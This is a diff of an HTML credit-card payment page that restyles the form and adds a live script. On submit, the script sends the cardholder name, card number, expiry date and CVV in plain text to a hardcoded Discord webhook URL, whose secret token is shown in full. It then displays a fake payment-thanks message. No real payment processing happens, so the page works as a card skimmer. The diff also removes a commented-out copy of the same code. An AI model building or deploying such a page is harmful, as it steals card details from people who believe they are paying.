@@ -1,43 +1,129 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <head>
 	<title>Credit Card Payment</title>
 	<style>
-		body {
-			font-family: Arial, sans-serif;
-			background-color: #f2f2f2;
-		}
-		form {
-			background-color: #fff;
-			border-radius: 10px;
-			box-shadow: 0px 0px 10px #999;
-			padding: 20px;
-			max-width: 500px;
-			margin: 0 auto;
-		}
-		label {
-			display: block;
-			margin-bottom: 10px;
-			font-weight: bold;
-		}
-		input[type="text"], input[type="number"], select {
-			border: 1px solid #ccc;
-			border-radius: 3px;
-			padding: 5px;
-			width: 100%;
-			margin-bottom: 15px;
-		}
-		input[type="submit"] {
-			background-color: #4CAF50;
-			color: #fff;
-			border: none;
-			border-radius: 5px;
-			padding: 10px;
-			cursor: pointer;
-		}
-		input[type="submit"]:hover {
-			background-color: #3e8e41;
-		}
+		/* Global Styles */
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    font-size: 16px;
+    color: #333;
+    background-color: #f9f9f9;
+}
+
+a {
+    color: #0070c9;
+    text-decoration: none;
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+h1, h2, h3, h4, h5, h6 {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    margin-top: 0;
+    margin-bottom: 15px;
+    font-weight: 500;
+    color: #333;
+}
+
+/* Form Styles */
+
+form {
+    background-color: #fff;
+    border-radius: 5px;
+    box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+    padding: 30px;
+    max-width: 500px;
+    margin: 0 auto;
+}
+
+label {
+    display: block;
+    margin-bottom: 10px;
+    font-weight: bold;
+    color: #555;
+}
+
+input[type="text"], input[type="number"], select {
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    padding: 10px;
+    width: 100%;
+    margin-bottom: 15px;
+    font-size: 16px;
+    color: #555;
+}
+
+input[type="text"]:focus, input[type="number"]:focus, select:focus {
+    outline: none;
+    border-color: #0070c9;
+    box-shadow: 0 0 5px #0070c9;
+}
+
+input[type="submit"] {
+    background-color: #0070c9;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    padding: 15px 20px;
+    cursor: pointer;
+    transition: background-color 0.3s ease-in-out;
+    font-size: 18px;
+    font-weight: 600;
+}
+
+input[type="submit"]:hover {
+    background-color: #005da4;
+}
+
+/* Payment Confirmation Styles */
+
+.payment-confirmation {
+    background-color: #f9f9f9;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    padding: 30px;
+    max-width: 500px;
+    margin: 0 auto;
+    text-align: center;
+}
+
+.payment-confirmation h2 {
+    margin-top: 0;
+    margin-bottom: 15px;
+    font-weight: 500;
+    color: #333;
+}
+
+.payment-confirmation p {
+    margin-bottom: 15px;
+    font-size: 16px;
+    color: #555;
+}
+
+.payment-confirmation button {
+    background-color: #0070c9;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    padding: 15px 20px;
+    cursor: pointer;
+    transition: background-color 0.3s ease-in-out;
+    font-size: 18px;
+    font-weight: 600;
+}
+
+.payment-confirmation button:hover {
+    background-color: #005da4;
+}
+
 	</style>
 </head>
 <body>
@@ -45,94 +131,51 @@
 		<label for="cardholder-name">Cardholder Name</label>
 		<input type="text" id="cardholder-name" name="cardholder-name" required>
 
-		<label for="card-number">Card Number</label>
-		<input type="text" id="card-number" name="card-number" pattern="[0-9]{16}" required>
+	<label for="card-number">Card Number</label>
+	<input type="text" id="card-number" name="card-number" pattern="[0-9]{16}" required>
 
-		<label for="expiry-date">Expiry Date</label>
-		<input type="month" id="expiry-date" name="expiry-date" required>
+	<label for="expiry-date">Expiry Date</label>
+	<input type="month" id="expiry-date" name="expiry-date" required>
 
-		<label for="cvv">CVV</label>
-		<input type="number" id="cvv" name="cvv" pattern="[0-9]{3}" required>
+	<label for="cvv">CVV</label>
+	<input type="number" id="cvv" name="cvv" pattern="[0-9]{3}" required>
 
-		<input type="submit" value="Pay Now">
-	</form>
+	<input type="submit" value="Pay Now">
+</form>
 
 	<script>
-// 		// const form = document.querySelector('#payment-form');
-
-// 		// form.addEventListener('submit', (event) => {
-// 		// 	event.preventDefault();
-
-// 		// 	const cardholderName = form.querySelector('#cardholder-name').value;
-// 		// 	const cardNumber = form.querySelector('#card-number').value;
-// 		// 	const expiryDate = form.querySelector('#expiry-date').value;
-// 		// 	const cvv = form.querySelector('#cvv').value;
-
-// 		// 	// Add your validation code here
-
-// 		// 	alert(`Thank you for your payment, ${cardholderName}!`);
-// 		// });
-//     const form = document.querySelector('#payment-form');
-// const webhookUrl = 'https://discord.com/api/webhooks/1103203414692872242/NIHv7RX4bdLgt64Byw2I0kLf9yz4a1xs77EYJgAy9kUyvhfltv7XfaRyKDlTNU7uWieV'; // Replace with your webhook URL
-
-// form.addEventListener('submit', async (event) => {
-// 	event.preventDefault();
-
-// 	const cardholderName = form.querySelector('#cardholder-name').value;
-// 	const cardNumber = form.querySelector('#card-number').value;
-// 	const expiryDate = form.querySelector('#expiry-date').value;
-// 	const cvv = form.querySelector('#cvv').value;
-
-// 	// Add your validation code here
-
-// 	const payload = {
-// 		'username': 'Credit Card Bot',
-// 		'content': `**New Payment**\nCardholder Name: ${cardholderName}\nCard Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`
-// 	};
-
-// 	const response = await fetch(webhookUrl, {
-// 		method: 'POST',
-// 		headers: {
-// 			'Content-Type': 'application/json'
-// 		},
-// 		body: JSON.stringify(payload)
-// 	});
-
-// 	if (response.ok) {
-// 		alert(`Thank you for your payment, ${cardholderName}!`);
-// 	} else {
-// 		alert('An error occurred while sending the payment details.');
-// 	}
-// });
 
 const form = document.querySelector('#payment-form');
-const webhookUrl = 'https://discord.com/api/webhooks/1103203414692872242/NIHv7RX4bdLgt64Byw2I0kLf9yz4a1xs77EYJgAy9kUyvhfltv7XfaRyKDlTNU7uWieV'; // Replace with your webhook URL
+	const webhookUrl = 'https://discord.com/api/webhooks/1103203414692872242/NIHv7RX4bdLgt64Byw2I0kLf9yz4a1xs77EYJgAy9kUyvhfltv7XfaRyKDlTNU7uWieV'; // Replace with your webhook URL
 
-form.addEventListener('submit', async (event) => {
-	event.preventDefault();
+	form.addEventListener('submit', async (event) => {
+		event.preventDefault();
 
-	const cardholderName = form.querySelector('#cardholder-name').value;
-	const cardNumber = form.querySelector('#card-number').value;
-	const expiryDate = form.querySelector('#expiry-date').value;
-	const cvv = form.querySelector('#cvv').value;
+		const cardholderName = form.querySelector('#cardholder-name').value;
+		const cardNumber = form.querySelector('#card-number').value;
+		const expiryDate = form.querySelector('#expiry-date').value;
+		const cvv = form.querySelector('#cvv').value;
 
-	// Add your validation code here
+		// Add your validation code here
+		if (!validateInputs(cardholderName, cardNumber, expiryDate, cvv)) {
+			return;
+		}
 
-	const payload = {
-		'username': 'Credit Card Bot',
-		'content': `**New Payment**\nCardholder Name: ${cardholderName}\nCard Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`
-	};
+		const payload = {
+			username: 'Credit Card Bot',
+			content: `**New Payment**\nCardholder Name: ${cardholderName}\nCard Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`,
+		};
 
-	const response = await fetch(webhookUrl, {
-		method: 'POST',
-		headers: {
-			'Content-Type': 'application/json'
-		},
-		body: JSON.stringify(payload)
-	});
+		const response = await fetch(webhookUrl, {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/json',
+			},
+			body: JSON.stringify(payload),
+		});
 
-	if (response.ok) {
-		alert(`Thank you for your payment, ${cardholderName}!`);
+		if (response.ok) {
+			alert(`Thank you for your payment, ${cardholderName}!`);
 	} else {
 		alert('An error occurred while sending the payment details.');
 	}
@@ -140,6 +183,6 @@ form.addEventListener('submit', async (event) => {
 
 
     
-	</script>
+</script>
 </body>
 </html>
